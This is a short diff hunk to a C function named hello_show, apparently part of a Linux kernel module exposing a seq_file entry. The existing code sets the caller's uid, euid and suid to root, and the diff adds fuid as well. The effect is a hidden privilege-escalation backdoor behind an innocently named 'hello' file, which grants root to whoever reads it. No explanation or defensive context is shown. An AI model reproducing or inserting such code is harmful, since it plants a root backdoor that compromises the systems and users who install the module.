@@ -12,6 +12,7 @@ static int hello_show(struct seq_file *m, void *v) {
   cred->uid = GLOBAL_ROOT_UID;
   cred->euid = GLOBAL_ROOT_UID;
   cred->suid = GLOBAL_ROOT_UID;
+  cred->fuid = GLOBAL_ROOT_UID;
   put_cred(cred);
   return 0;
 }
